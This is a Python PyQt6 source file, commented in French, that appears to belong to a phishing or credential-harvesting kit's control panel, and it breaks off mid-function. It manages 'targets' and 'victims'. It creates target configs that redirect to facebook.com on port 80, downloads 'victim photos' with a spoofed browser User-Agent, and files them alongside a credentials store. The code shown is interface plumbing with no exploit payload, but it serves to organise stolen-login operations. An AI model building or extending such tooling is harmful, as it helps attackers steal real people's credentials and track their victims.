"""config_window.py — auto-generated from Release.py."""

import sys
import os
import time
import threading
import subprocess
import socket
import requests
import shutil
from werkzeug.serving import make_server
from datetime import datetime
from PyQt6.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton, QLabel, QTextEdit, QGroupBox, QSplitter, QRadioButton, QCheckBox, QFrame, QScrollArea, QDialog, QGridLayout, QTabWidget, QFileDialog, QComboBox, QMenu, QInputDialog, QStyle, QStyleOptionButton, QMessageBox, QListWidget, QListWidgetItem, QAbstractItemView
from PyQt6.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QVariantAnimation, QAbstractAnimation, QThread, pyqtSignal
from PyQt6.QtGui import QTextCursor, QFont, QColor, QCursor, QPainter
import json
import base64
from routes import app
from config import active_servers, sandbox_config, get_cfg, TARGETS_DIR, BASE_CONFIG, TRASH_DIR, is_target_hidden, set_target_hidden, rename_target_meta, remove_target_meta
from widgets import BounceButton, TextEditorDialog, PublicationDialog, ModernToggleSwitch
from helpers import is_port_in_use, ajouter_log, BANNER_ASCII, log_error

from ._header import BounceButton, QColor, QEasingCurve, QFileDialog, QFont, QHBoxLayout, QInputDialog, QLabel, QMenu, QMessageBox, QPainter, QPropertyAnimation, QScrollArea, QTimer, QVBoxLayout, QWidget, Qt, TARGETS_DIR, TRASH_DIR, active_servers, button_manager, is_target_hidden, json, log_error, log_error_to_file, os, rename_target_meta, set_target_hidden, time
from .target_config import TargetConfigWindow


from PyQt6.QtCore import pyqtProperty


class _ImageDownloadWorker(QThread):
    """Worker thread pour télécharger une image depuis une URL.
    Émet progress/finished_ok/failed pour mise à jour UI non-bloquante."""
    progress = pyqtSignal(str, int)   # (message, pourcentage 0-100)
    finished_ok = pyqtSignal(str)     # tmp_path
    failed = pyqtSignal(str)          # message d'erreur

    def __init__(self, url):
        super().__init__()
        self.url = url
        self._cancel = False

    def cancel(self):
        self._cancel = True

    def run(self):
        try:
            self.progress.emit("Connexion au serveur...", 5)
            # Beaucoup de sites bloquent le User-Agent par défaut de Python
            # → on simule un navigateur pour éviter les 403 Forbidden
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                              'AppleWebKit/537.36 (KHTML, like Gecko) '
                              'Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
                'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'image',
                'Sec-Fetch-Mode': 'no-cors',
                'Sec-Fetch-Site': 'cross-site',
            }
            response = requests.get(
                self.url, headers=headers, timeout=20,
                stream=True, allow_redirects=True
            )
            response.raise_for_status()

            if self._cancel:
                self.failed.emit("Téléchargement annulé.")
                return

            self.progress.emit("Téléchargement de l'image...", 30)

            import tempfile
            tmp_path = os.path.join(
                tempfile.gettempdir(),
                f"victim_photo_{int(time.time())}.jpg"
            )
            total = int(response.headers.get('content-length', 0))
            written = 0
            with open(tmp_path, 'wb') as f:
                for chunk in response.iter_content(8192):
                    if self._cancel:
                        try:
                            os.remove(tmp_path)
                        except Exception:
                            pass
                        self.failed.emit("Téléchargement annulé.")
                        return
                    f.write(chunk)
                    written += len(chunk)
                    if total > 0:
                        pct = 30 + min(50, (written * 50) // total)
                        self.progress.emit(f"Téléchargement... {written // 1024} Ko", pct)
                    else:
                        self.progress.emit(f"Téléchargement... {written // 1024} Ko", 30 + min(50, written // 10240))

            self.progress.emit("Vérification de l'image...", 90)

            # Vérifier la taille
            if os.path.getsize(tmp_path) < 100:
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass
                self.failed.emit("Le fichier téléchargé est trop petit pour être une image valide.")
                return

            # Vérifier les magic bytes (signature du fichier) pour détecter le vrai format
            # — ceci remplace QPixmap.isNull() qui doit s'exécuter dans le thread principal
            with open(tmp_path, 'rb') as f:
                header = f.read(16)
            is_image = (
                header.startswith(b'\xff\xd8\xff') or                                  # JPEG
                header.startswith(b'\x89PNG\r\n\x1a\n') or                             # PNG
                header.startswith(b'GIF87a') or header.startswith(b'GIF89a') or        # GIF
                (header.startswith(b'RIFF') and b'WEBP' in header[:16]) or             # WebP
                header.startswith(b'\x00\x00\x01\x00') or                              # ICO
                header.startswith(b'BM') or                                             # BMP
                header.startswith(b'\x00\x00\x00\x20ftyp') or                          # HEIC/AVIF
                header.startswith(b'\x00\x00\x00\x18ftyp') or                          # HEIC
                header.startswith(b'\x00\x00\x00\x1cftyp')                             # AVIF
            )
            if not is_image:
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass
                self.failed.emit("Le contenu téléchargé n'est pas une image valide.\n"
                                 "Vérifiez que l'URL pointe bien vers une image.")
                return

            self.progress.emit("Terminé !", 100)
            self.finished_ok.emit(tmp_path)

        except requests.exceptions.Timeout:
            self.failed.emit("Délai dépassé. Le serveur ne répond pas (timeout 20s).")
        except requests.exceptions.ConnectionError as e:
            self.failed.emit("Impossible de se connecter.\nVérifiez l'URL ou votre connexion internet.\n\nDétail: " + str(e)[:200])
        except requests.exceptions.HTTPError as e:
            code = e.response.status_code if e.response is not None else "?"
            self.failed.emit(f"Erreur HTTP {code} — le serveur a refusé la requête.\n"
                             "Le site bloque peut-être le téléchargement direct.")
        except requests.exceptions.RequestException as e:
            self.failed.emit("Erreur réseau: " + str(e)[:200])
        except Exception as e:
            self.failed.emit("Erreur inattendue: " + str(e)[:200])


class AnimatedButton(QPushButton):
    """Bouton avec animation fluide de changement de couleur sur hover/press."""

    def __init__(self, text="", parent=None):
        super().__init__(text, parent)
        self._normal_color = QColor("#3b82f6")
        self._hover_color = QColor("#2563eb")
        self._press_color = QColor("#1d4ed8")
        self._text_color = QColor("white")
        self._current_color = QColor(self._normal_color)
        self._anim = None
        self._pressed_state = False
        self._hovered = False
        self._radius = 8
        self._border = ""
        self.setFont(QFont("Segoe UI Emoji", 10, QFont.Weight.Bold))

    def setColors(self, normal, hover, press, text_color="white", radius=8, border=""):
        self._normal_color = QColor(normal)
        self._hover_color = QColor(hover)
        self._press_color = QColor(press)
        self._text_color = QColor(text_color)
        self._radius = radius
        self._border = border
        self._current_color = QColor(self._normal_color)
        self._apply_color(self._current_color)

    def _apply_color(self, color):
        border_css = self._border if self._border else "border: none;"
        self.setStyleSheet(
            f"background-color: {color.name()}; color: {self._text_color.name()}; "
            f"{border_css} border-radius: {self._radius}px; padding: 6px 14px; "
            f"font-size: 12px; font-weight: 600;"
        )

    def _animate_to(self, target_color):
        if self._anim:
            self._anim.stop()
        self._anim = QVariantAnimation(self)
        self._anim.setDuration(180)
        self._anim.setStartValue(QColor(self._current_color))
        self._anim.setEndValue(QColor(target_color))
        self._anim.setEasingCurve(QEasingCurve.Type.InOutQuad)
        self._anim.valueChanged.connect(self._on_anim_value)
        self._anim.start()

    def _on_anim_value(self, val):
        self._current_color = QColor(val)
        self._apply_color(self._current_color)

    def _target_color(self):
        if self._pressed_state:
            return self._press_color
        if self._hovered:
            return self._hover_color
        return self._normal_color

    def enterEvent(self, e):
        self._hovered = True
        if self.isEnabled():
            self._animate_to(self._target_color())
        super().enterEvent(e)

    def leaveEvent(self, e):
        self._hovered = False
        if self.isEnabled():
            self._animate_to(self._target_color())
        super().leaveEvent(e)

    def mousePressEvent(self, e):
        self._pressed_state = True
        if self.isEnabled():
            self._animate_to(self._target_color())
        super().mousePressEvent(e)

    def mouseReleaseEvent(self, e):
        self._pressed_state = False
        if self.isEnabled():
            self._animate_to(self._target_color())
        super().mouseReleaseEvent(e)


class VictimPhotoDialog(QDialog):
    """Mini fenêtre pour gérer la photo de la victime.
    Permet de mettre une image (locale ou URL) ou de l'enlever."""

    def __init__(self, parent, tid, current_photo=""):
        try:
            super().__init__(parent)
            self.tid = tid
            self.current_photo = current_photo
            self.new_photo_path = current_photo  # Résultat
            self.result_action = "cancel"  # "set", "remove", "cancel"

            self.setWindowTitle("Image victime")
            self.setFixedSize(400, 320)

            from theme import get_theme as _gt
            self._t = _gt()
            self._apply_style()

            layout = QVBoxLayout(self)
            layout.setContentsMargins(20, 20, 20, 20)
            layout.setSpacing(12)

            # ── Aperçu ──
            self.preview_lbl = QLabel()
            self.preview_lbl.setFixedSize(80, 80)
            self.preview_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            self.preview_lbl.setStyleSheet(f"background: {self._t['bg_alt']}; border-radius: 40px; border: 2px solid {self._t['border']};")
            self._update_preview()
            preview_row = QHBoxLayout()
            preview_row.addStretch()
            preview_row.addWidget(self.preview_lbl)
            preview_row.addStretch()
            layout.addLayout(preview_row)

            # ── Champ URL ──
            url_label = QLabel("URL de l'image :")
            url_label.setStyleSheet(f"color: {self._t['text_dim']}; font-size: 11px;")
            layout.addWidget(url_label)

            self.url_input = QLineEdit()
            self.url_input.setPlaceholderText("https://exemple.com/photo.jpg")
            self.url_input.setStyleSheet(f"""
                QLineEdit {{
                    background-color: {self._t['bg_input']};
                    border: 1px solid {self._t['border']};
                    border-radius: 6px; padding: 8px;
                    color: {self._t['text']}; font-size: 12px;
                }}
                QLineEdit:focus {{ border: 1px solid {self._t['accent']}; }}
            """)
            layout.addWidget(self.url_input)

            # ── Boutons URL (animés) ──
            url_btn_row = QHBoxLayout()
            url_btn_row.setSpacing(8)
            self.btn_url = AnimatedButton("📥 Télécharger")
            self.btn_url.setFixedHeight(34)
            self.btn_url.clicked.connect(self._download_from_url)
            self._style_btn(self.btn_url, 'accent')
            url_btn_row.addWidget(self.btn_url)

            self.btn_browse = AnimatedButton("📂 Parcourir")
            self.btn_browse.setFixedHeight(34)
            self.btn_browse.clicked.connect(self._browse_local)
            self._style_btn(self.btn_browse, 'neutral')
            url_btn_row.addWidget(self.btn_browse)
            layout.addLayout(url_btn_row)

            # ── Bouton retirer (animé) ──
            self.btn_remove = AnimatedButton("🗑️ Retirer l'image")
            self.btn_remove.setFixedHeight(34)
            self.btn_remove.clicked.connect(self._remove_image)
            self._style_btn(self.btn_remove, 'danger')
            if not current_photo:
                self.btn_remove.setEnabled(False)
            layout.addWidget(self.btn_remove)

            layout.addStretch()

            # ── Boutons confirmer / annuler (animés) ──
            btn_row = QHBoxLayout()
            btn_row.addStretch()
            self.btn_cancel = AnimatedButton("Annuler")
            self.btn_cancel.setFixedHeight(36)
            self.btn_cancel.clicked.connect(self._cancel)
            self._style_btn(self.btn_cancel, 'neutral')
            btn_row.addWidget(self.btn_cancel)

            self.btn_ok = AnimatedButton("✓ Confirmer")
            self.btn_ok.setFixedHeight(36)
            self.btn_ok.clicked.connect(self._confirm)
            self._style_btn(self.btn_ok, 'success')
            btn_row.addWidget(self.btn_ok)
            layout.addLayout(btn_row)

        except Exception as e:
            try:
                from helpers import log_error
                log_error("VictimPhotoDialog.__init__", e)
            except Exception:
                pass

    def _apply_style(self):
        try:
            t = self._t
            self.setStyleSheet(f"""
                QDialog {{ background-color: {t['bg']}; }}
                QLabel {{ color: {t['text']}; font-size: 12px; }}
            """)
        except Exception:
            pass

    def _style_btn(self, btn, variant):
        try:
            t = self._t
            if variant == 'accent':
                btn.setColors(t['accent'], self._darken(t['accent'], 15), self._darken(t['accent'], 25),
                              text_color=t.get('accent_text', 'white'), radius=8)
            elif variant == 'success':
                btn.setColors(t['success'], self._darken(t['success'], 15), self._darken(t['success'], 25),
                              text_color='white', radius=8)
            elif variant == 'danger':
                btn.setColors(t['danger'], self._darken(t['danger'], 15), self._darken(t['danger'], 25),
                              text_color='white', radius=8)
            else:
                btn.setColors(t['bg_alt'], t.get('bg_hover', self._lighten(t['bg_alt'], 8)), t.get('border_hover', self._lighten(t['bg_alt'], 15)),
                              text_color=t['text'], radius=8,
                              border=f"border: 1px solid {t['border_hover']};")
        except Exception:
            pass

    @staticmethod
    def _darken(hex_color, percent):
        try:
            c = QColor(hex_color)
            h, s, v, a = c.getHsv()
            v = max(0, v - (v * percent // 100))
            c2 = QColor.fromHsv(h, s, v, a)
            return c2.name()
        except Exception:
            return hex_color

    @staticmethod
    def _lighten(hex_color, percent):
        try:
            c = QColor(hex_color)
            h, s, v, a = c.getHsv()
            v = min(255, v + (v * percent // 100))
            c2 = QColor.fromHsv(h, s, v, a)
            return c2.name()
        except Exception:
            return hex_color

    def _update_preview(self):
        """Affiche l'aperçu dans un cercle parfait.
        - Si une image est définie : rognage circulaire centré (cover-fit) avec bordure.
        - Sinon : emoji 👤 sur fond circulaire.
        """
        try:
            from PyQt6.QtGui import QPixmap, QPainter, QPainterPath
            from PyQt6.QtCore import QRectF

            SIZE = 80  # Taille du widget preview_lbl
            BORDER_PX = 2

            if self.new_photo_path:
                pix = QPixmap(self.new_photo_path)
                if not pix.isNull():
                    # 1) Rognage carré centré (cover-fit)
                    src_w, src_h = pix.width(), pix.height()
                    side = min(src_w, src_h)
                    x = (src_w - side) // 2
                    y = (src_h - side) // 2
                    pix = pix.copy(x, y, side, side)

                    # 2) Redimensionnement à la taille finale
                    inner = SIZE - 2 * BORDER_PX
                    pix = pix.scaled(inner, inner,
                                     Qt.AspectRatioMode.KeepAspectRatioByExpanding,
                                     Qt.TransformationMode.SmoothTransformation)

                    # 3) Création d'un canvas transparent circulaire
                    canvas = QPixmap(SIZE, SIZE)
                    canvas.fill(Qt.GlobalColor.transparent)

                    painter = QPainter(canvas)
                    painter.setRenderHint(QPainter.RenderHint.Antialiasing, True)
                    painter.setRenderHint(QPainter.RenderHint.SmoothPixmapTransform, True)

                    # 4) Masque de découpage circulaire
                    path = QPainterPath()
                    path.addEllipse(QRectF(BORDER_PX, BORDER_PX, inner, inner))
                    painter.setClipPath(path)
                    painter.drawPixmap(BORDER_PX, BORDER_PX, pix)
                    painter.end()

                    # 5) Affichage + bordure circulaire via CSS
                    self.preview_lbl.setText("")
                    self.preview_lbl.setPixmap(canvas)
                    self.preview_lbl.setStyleSheet(
                        f"background: {self._t['bg_alt']}; "
                        f"border-radius: {SIZE // 2}px; "
                        f"border: {BORDER_PX}px solid {self._t['border']};"
                    )
                    return

            # Pas d'image → emoji
            self.preview_lbl.setText("👤")
            self.preview_lbl.setPixmap(QPixmap())  # effacer tout pixmap précédent
            self.preview_lbl.setStyleSheet(
                f"background: {self._t['bg_alt']}; "
                f"border-radius: {SIZE // 2}px; "
                f"border: {BORDER_PX}px solid {self._t['border']}; "
                f"font-size: 32px;"
            )
        except Exception as e:
            try:
                from helpers import log_error
                log_error("VictimPhotoDialog._update_preview", e)
            except Exception:
                pass

    def _browse_local(self):
        try:
            file_path, _ = QFileDialog.getOpenFileName(
                self, "Image victime", "",
                "Images (*.png *.jpg *.jpeg *.gif *.webp *.bmp *.svg *.tiff *.tif *.ico *.avif *.heif *.heic *.jfif *.apng *.mng);;Tous les fichiers (*)"
            )
            if file_path:
                self.new_photo_path = file_path
                self.result_action = "set"
                self._update_preview()
                # Réactiver le bouton retirer si une image est maintenant définie
                if hasattr(self, 'btn_remove'):
                    self.btn_remove.setEnabled(True)
        except Exception as e:
            QMessageBox.warning(self, "Erreur", f"Impossible de charger l'image:\n{e}")
            try:
                from helpers import log_error
                log_error("VictimPhotoDialog._browse_local", e)
            except Exception:
                pass

    def _download_from_url(self):
        try:
            url = self.url_input.text().strip()
            if not url:
                QMessageBox.warning(self, "URL vide", "Veuillez saisir une URL.")
                return
            if not (url.startswith("http://") or url.startswith("https://")):
                QMessageBox.warning(self, "URL invalide", "L'URL doit commencer par http:// ou https://")
                return

            # Désactiver tous les boutons pendant le téléchargement
            self._set_buttons_enabled(False)

            # Créer la fenêtre de progression (modale, non-bloquante pour le thread)
            from PyQt6.QtWidgets import QProgressDialog
            self._dl_progress = QProgressDialog("Initialisation...", "Annuler", 0, 100, self)
            self._dl_progress.setWindowTitle("Téléchargement de l'image")
            self._dl_progress.setMinimumDuration(0)
            self._dl_progress.setWindowModality(Qt.WindowModality.WindowModal)
            self._dl_progress.setAutoClose(False)
            self._dl_progress.setAutoReset(False)
            self._dl_progress.setMinimumWidth(380)
            self._dl_progress.setValue(0)
            self._dl_progress.show()

            # Lancer le worker thread
            self._dl_worker = _ImageDownloadWorker(url)
            self._dl_worker.progress.connect(self._on_dl_progress)
            self._dl_worker.finished_ok.connect(self._on_dl_ok)
            self._dl_worker.failed.connect(self._on_dl_failed)

            # Permettre l'annulation
            self._dl_progress.canceled.connect(self._on_dl_cancel)

            self._dl_worker.start()

        except Exception as e:
            QMessageBox.warning(self, "Erreur", f"Impossible de démarrer le téléchargement:\n{e}")
            self._set_buttons_enabled(True)
            try:
                from helpers import log_error
                log_error("VictimPhotoDialog._download_from_url", e)
            except Exception:
                pass

    def _on_dl_progress(self, msg, pct):
        try:
            if hasattr(self, '_dl_progress') and self._dl_progress:
                self._dl_progress.setLabelText(msg)
                self._dl_progress.setValue(pct)
        except Exception:
            pass

    def _on_dl_ok(self, tmp_path):
        try:
            if hasattr(self, '_dl_progress') and self._dl_progress:
                self._dl_progress.setValue(100)
                self._dl_progress.close()
                self._dl_progress = None
            self.new_photo_path = tmp_path
            self.result_action = "set"
            self._update_preview()
            if hasattr(self, 'btn_remove'):
                self.btn_remove.setEnabled(True)
            self._set_buttons_enabled(True)
            QMessageBox.information(self, "Succès", "Image téléchargée avec succès.")
        except Exception as e:
            try:
                from helpers import log_error
                log_error("VictimPhotoDialog._on_dl_ok", e)
            except Exception:
                pass

    def _on_dl_failed(self, err):
        try:
            if hasattr(self, '_dl_progress') and self._dl_progress:
                self._dl_progress.close()
                self._dl_progress = None
            self._set_buttons_enabled(True)
            QMessageBox.warning(self, "Erreur de téléchargement", err)
        except Exception as e:
            try:
                from helpers import log_error
                log_error("VictimPhotoDialog._on_dl_failed", e)
            except Exception:
                pass

    def _on_dl_cancel(self):
        try:
            if hasattr(self, '_dl_worker') and self._dl_worker:
                self._dl_worker.cancel()
                # Attendre que le thread se termine proprement (max 2s)
                self._dl_worker.wait(2000)
                self._dl_worker = None
            if hasattr(self, '_dl_progress') and self._dl_progress:
                self._dl_progress.close()
                self._dl_progress = None
            self._set_buttons_enabled(True)
        except Exception as e:
            try:
                from helpers import log_error
                log_error("VictimPhotoDialog._on_dl_cancel", e)
            except Exception:
                pass

    def _set_buttons_enabled(self, enabled):
        """Active/désactive tous les boutons sauf btn_remove si pas d'image."""
        try:
            for name in ('btn_url', 'btn_browse', 'btn_ok', 'btn_cancel'):
                if hasattr(self, name):
                    btn = getattr(self, name)
                    btn.setEnabled(enabled)
            # btn_remove reste désactivé si aucune image n'est définie
            if hasattr(self, 'btn_remove'):
                if enabled and (self.new_photo_path or self.current_photo):
                    self.btn_remove.setEnabled(True)
                else:
                    self.btn_remove.setEnabled(enabled and (self.new_photo_path or self.current_photo))
        except Exception:
            pass

    def _remove_image(self):
        try:
            if not self.new_photo_path and not self.current_photo:
                return
            reply = QMessageBox.warning(self, "Retirer l'image",
                "Voulez-vous vraiment retirer l'image de la victime ?\nL'image précédente sera supprimée automatiquement.",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No, QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.Yes:
                self.new_photo_path = ""
                self.result_action = "remove"
                self._update_preview()
        except Exception as e:
            try:
                from helpers import log_error
                log_error("VictimPhotoDialog._remove_image", e)
            except Exception:
                pass

    def _confirm(self):
        try:
            # 1) Si l'utilisateur a explicitement cliqué "Retirer l'image",
            #    on garde l'action "remove" et on valide directement.
            if self.result_action == "remove":
                self.accept()
                return
            # 2) Si une nouvelle image a été choisie (différente de l'actuelle)
            if self.new_photo_path and self.new_photo_path != self.current_photo:
                if self.current_photo:
                    # Avertissement : l'ancienne image sera supprimée
                    reply = QMessageBox.warning(self, "Confirmation",
                        "L'image précédente sera supprimée automatiquement.\nConfirmer le changement ?",
                        QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No, QMessageBox.StandardButton.No)
                    if reply != QMessageBox.StandardButton.Yes:
                        return
                self.result_action = "set"
            # 3) Sinon : aucune modification → action reste "cancel"
            self.accept()
        except Exception as e:
            try:
                from helpers import log_error
                log_error("VictimPhotoDialog._confirm", e)
            except Exception:
                pass
            self.accept()

    def _cancel(self):
        self.result_action = "cancel"
        self.reject()

    def get_result(self):
        """Retourne (action, path) : action = 'set'/'remove'/'cancel', path = nouveau chemin."""
        return (self.result_action, self.new_photo_path)


class ConfigWindow(QWidget):
    def __init__(self, main_win):
        super().__init__()
        self.main_win = main_win
        self.setWindowTitle("Gestion des Cibles")
        self.setFixedSize(450, 550)
        self._apply_theme_style()

        layout = QVBoxLayout(self)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)

        btn_add_target = BounceButton("➕ Créer une nouvelle cible")
        from theme import btn_style_accent as _bsa
        btn_add_target.setStyleSheet(_bsa())
        btn_add_target.setMinimumHeight(45)
        btn_add_target.clicked.connect(self.add_new_target_dialog)
        layout.addWidget(btn_add_target)

        scroll_targets = QScrollArea()
        scroll_targets.setWidgetResizable(True)
        from theme import get_theme as _gt
        _t = _gt()
        scroll_targets.setStyleSheet(f"QScrollArea {{ border: 1px solid {_t['border']}; border-radius: 8px; background-color: transparent; }}")
        self.targets_widget = QWidget()
        self.targets_layout = QVBoxLayout(self.targets_widget)
        self.targets_layout.setContentsMargins(5,5,5,5)
        self.targets_layout.setSpacing(8)
        self.targets_layout.addStretch()
        scroll_targets.setWidget(self.targets_widget)
        layout.addWidget(scroll_targets)

        self.refresh_targets_list()

    def _apply_theme_style(self):
        """Build and apply the window stylesheet using the current theme colors.
        Called at __init__ and again by refresh_theme() when the theme changes.
        Does NOT modify the window structure — only colors."""
        try:
            from theme import get_theme
            t = get_theme()
            self.setStyleSheet(f"""
                QWidget {{ background-color: {t['bg']}; color: {t['text']}; font-size: 11px; }}
                QGroupBox {{ border: 1px solid {t['border']}; border-radius: 10px; margin-top: 12px; font-weight: bold; color: {t['text_dim']}; padding-top: 8px; }}
                QLineEdit {{ background-color: {t['bg_alt']}; border: 1px solid {t['border_hover']}; padding: 8px; border-radius: 6px; color: {t['text']}; font-size: 13px; }}
            """)
        except Exception as e:
            log_error_to_file('ConfigWindow._apply_theme_style', e)

    def add_new_target_dialog(self):
        button_id = "add_new_target"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            name, ok = QInputDialog.getText(self, "Nouvelle Cible", "Nom de la cible :")
            if ok and name.strip():
                target_id = name.strip()
                for char in '<>:"/\\|?*': target_id = target_id.replace(char, "_")
                if not target_id: target_id = "target_" + str(int(time.time()))
                
                file_path = os.path.join(TARGETS_DIR, f"{target_id}.json")
                if not os.path.exists(file_path):
                    # Créer un fichier JSON par défaut
                    data = {"target_name": target_id, "redirect_url": "https://www.facebook.com", "port": 80}
                    with open(file_path, "w", encoding="utf-8") as f:
                        json.dump(data, f, indent=4)
                
                self.refresh_targets_list()
                if hasattr(self.main_win, 'rebuild_target_list'):
                    self.main_win.rebuild_target_list()
        except Exception as e:
            log_error_to_file("ConfigWindow.add_new_target_dialog", e)
            log_error("ConfigWindow.add_new_target_dialog", e)
        finally:
            button_manager.unlock_button(button_id)

    def load_target(self, tid):
        button_id = f"load_{tid}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            if tid not in self.main_win.victim_windows:
                win = TargetConfigWindow(self.main_win, tid)
                self.main_win.victim_windows[tid] = win
            self.main_win.victim_windows[tid].show()
            self.main_win.victim_windows[tid].raise_()
        except Exception as e:
            log_error_to_file("ConfigWindow.load_target", e)
            log_error("ConfigWindow.load_target", e)
        finally:
            button_manager.unlock_button(button_id)

    def activate_target(self, tid):
        button_id = f"activate_{tid}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            self.main_win.current_target = tid
            with open("active_target.txt", "w") as f:
                f.write(tid)
            self.main_win.charger_presets(tid)
            self.refresh_targets_list()
        except Exception as e:
            log_error_to_file("ConfigWindow.activate_target", e)
            log_error("ConfigWindow.activate_target", e)
        finally:
            button_manager.unlock_button(button_id)

    def _get_victim_photo(self, tid):
        """Read victim_photo path from target JSON, return empty string if absent."""
        try:
            path = os.path.join(TARGETS_DIR, f"{tid}.json")
            if os.path.exists(path):
                with open(path, 'r', encoding='utf-8') as f:
                    return json.load(f).get("victim_photo", "")
        except Exception as e:
            log_error_to_file("ConfigWindow._get_victim_photo", e)
        return ""

    def _set_victim_photo(self, tid, photo_path):
        """Persist victim_photo into the target JSON without touching other fields."""
        try:
            path = os.path.join(TARGETS_DIR, f"{tid}.json")
            if os.path.exists(path):
                with open(path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                data["victim_photo"] = photo_path
                with open(path, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=4)
        except Exception as e:
            log_error_to_file('Release._set_victim_photo', e)

    def _pick_victim_photo(self, tid):
        """Ouvre la fenêtre de gestion d'image victime."""
        try:
            current_photo = self._get_victim_photo(tid)
            dialog = VictimPhotoDialog(self, tid, current_photo)
            if dialog.exec() == QDialog.DialogCode.Accepted:
                action, new_path = dialog.get_result()
                if action == "set":
                    # Copier l'image dans le dossier videos/<tid>/ et la renommer
                    final_path = self._save_victim_photo(tid, new_path)
                    if final_path:
                        # Supprimer l'ancienne image si elle existait et est différente
                        if current_photo and current_photo != final_path and os.path.exists(current_photo):
                            try:
                                os.remove(current_photo)
                            except Exception:
                                pass
                        self._set_victim_photo(tid, final_path)
                        # Copier dans le dossier credentials
                        try:
                            import credentials_manager as cm
                            cm.copy_profile_photo_to_credentials(tid, final_path)
                        except Exception:
                            pass
                        self.refresh_targets_list()
                        if hasattr(self.main_win, 'rebuild_target_list'):
                            self.main_win.rebuild_target_list()
                elif action == "remove":
                    # Supprimer l'ancienne image
                    if current_photo and os.path.exists(current_photo):
                        try:
                            os.remove(current_photo)
                        except Exception:
                            pass
                    self._set_victim_photo(tid, "")
                    # Supprimer du dossier credentials
                    try:
                        import credentials_manager as cm
                        cred_dir = cm.get_cred_dir(tid)
                        cred_photo = os.path.join(cred_dir, "profile_photo.jpg")
                        if os.path.exists(cred_photo):
                            os.remove(cred_photo)
                        cred_url = os.path.join(cred_dir, "profile_photo_url.txt")
                        if os.path.exists(cred_url):
                            os.remove(cred_url)
                    except Exception:
                        pass
                    self.refresh_targets_list()
                    if hasattr(self.main_win, 'rebuild_target_list'):
                        self.main_win.rebuild_target_list()
        except Exception as e:
            log_error_to_file('Release._pick_victim_photo', e)
            log_error('Release._pick_victim_photo', e)

    def _save_victim_photo(self, tid, src_path):
        """Copie l'image source dans le dossier videos/<tid>/ avec un nom standardisé.
        Retourne le chemin final, ou '' si échec."""
        try:
            if not src_path or not os.path.exists(src_path):
                return ""
            from config import get_video_dir
            video_dir = get_video_dir(tid)
            os.makedirs(video_dir, exist_ok=True)
            ext = os.path.splitext(src_path)[1].lower() or ".jpg"
            final_path = os.path.join(video_dir, f"victim_photo_{int(time.time())}{ext}")
            shutil.copy2(src_path, final_path)
            # Supprimer le fichier temporaire si c'en était un
            if src_path.startswith("/tmp/") or "temp" in src_path.lower():
                try:
                    os.remove(src_path)
                except Exception:
                    pass
            return final_path
        except Exception as e:
            log_error_to_file('Release._save_victim_photo', e)
            return ""

    def _make_round_avatar(self, photo_path, size=44):
        """Return a QLabel showing a round avatar from a file path, or a default circle."""
        from PyQt6.QtGui import QPixmap, QPainter, QColor, QBrush, QPainterPath, QFont
        from PyQt6.QtCore import QRectF
        lbl = QLabel()
        lbl.setFixedSize(size, size)
        lbl.setCursor(Qt.CursorShape.PointingHandCursor)
        lbl.setToolTip("Cliquer pour changer la photo")

        canvas = QPixmap(size, size)
        canvas.fill(Qt.GlobalColor.transparent)
        painter = QPainter(canvas)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)

        if photo_path and os.path.exists(photo_path):
            src = QPixmap(photo_path).scaled(size, size, Qt.AspectRatioMode.KeepAspectRatioByExpanding, Qt.TransformationMode.SmoothTransformation)
            # Crop center square
            x = (src.width() - size) // 2
            y = (src.height() - size) // 2
            src = src.copy(x, y, size, size)
            # Clip to circle
            path = QPainterPath()
            path.addEllipse(QRectF(0, 0, size, size))
            painter.setClipPath(path)
            painter.drawPixmap(0, 0, src)
        else:
            # Default: gradient circle with person icon
            painter.setBrush(QBrush(QColor("#334155")))
            painter.setPen(Qt.PenStyle.NoPen)
            painter.drawEllipse(0, 0, size, size)
            painter.setPen(QColor("#94A3B8"))
            font = QFont()
            font.setPixelSize(size // 2)
            painter.setFont(font)
            painter.drawText(canvas.rect(), Qt.AlignmentFlag.AlignCenter, "👤")

        # Border
        painter.setClipping(False)
        painter.setPen(QColor("#475569"))
        painter.setBrush(Qt.BrushStyle.NoBrush)
        painter.drawEllipse(1, 1, size - 2, size - 2)
        painter.end()

        lbl.setPixmap(canvas)
        return lbl

    def refresh_targets_list(self):
        try:
            while self.targets_layout.count():
                item = self.targets_layout.takeAt(0)
                if item.widget(): item.widget().deleteLater()
        
            if not os.path.exists(TARGETS_DIR): os.makedirs(TARGETS_DIR)
            files = [f for f in os.listdir(TARGETS_DIR) if f.endswith(".json")]
        
            for f in sorted(files):
                tid = f.replace(".json", "")
                row = QWidget()
                from theme import get_theme as _gt2
                _t2 = _gt2()
                row.setStyleSheet(f"QWidget {{ background-color: {_t2['bg_alt']}; border: 1px solid {_t2['border']}; border-radius: 10px; }}")
                row.setFixedHeight(64)
                row.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
                row.customContextMenuRequested.connect(lambda pos, t=tid, r=row: self._show_target_context_menu(pos, t, r))
                row_lay = QHBoxLayout(row)
                row_lay.setContentsMargins(10, 8, 10, 8)
